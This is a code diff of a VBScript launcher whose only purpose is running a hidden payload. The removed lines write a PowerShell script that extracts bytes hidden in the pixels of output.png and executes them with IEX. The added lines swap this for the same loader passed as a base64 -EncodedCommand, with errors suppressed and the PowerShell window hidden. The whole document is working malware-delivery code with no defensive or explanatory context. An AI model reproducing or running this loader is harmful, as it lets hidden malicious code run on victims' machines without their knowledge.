@@ -1,5 +1,2 @@
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set FileTemp = FSO.CreateTextFile( "run.ps1",ForAppending,TristateFalse)  
-FileTemp.Write "sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("".\output.png"");$o=a Byte[] 1000;(0..0)|%{foreach($x in(0..999)){$p=$g.GetPixel($x,$_);$o[$_*1000+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..290]))"
-currentpath = createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path
-CreateObject("shell.application").ShellExecute "powershell.exe", currentpath & "\run.ps1" ,,,0
+on error resume next
+CreateObject("shell.application").ShellExecute "powershell.exe","-EncodedCommand cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AEEAZABkAC0AVAB5AHAAZQAgAC0AQQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AGEAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBCAGkAdABtAGEAcAAoACIALgBcAG8AdQB0AHAAdQB0AC4AcABuAGcAIgApADsAJABvAD0AYQAgAEIAeQB0AGUAWwBdACAAMQAwADAAMAA7ACgAMAAuAC4AMAApAHwAJQB7AGYAbwByAGUAYQBjAGgAKAAkAHgAIABpAG4AKAAwAC4ALgA5ADkAOQApACkAewAkAHAAPQAkAGcALgBHAGUAdABQAGkAeABlAGwAKAAkAHgALAAkAF8AKQA7ACQAbwBbACQAXwAqADEAMAAwADAAKwAkAHgAXQA9ACgAWwBtAGEAdABoAF0AOgA6AEYAbABvAG8AcgAoACgAJABwAC4AQgAtAGIAYQBuAGQAMQA1ACkAKgAxADYAKQAtAGIAbwByACgAJABwAC4ARwAtAGIAYQBuAGQAMQA1ACkAKQB9AH0AOwAkAGcALgBEAGkAcwBwAG8AcwBlACgAKQA7AEkARQBYACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAG8AWwAwAC4ALgAyADkAMABdACkAKQA=",,,0
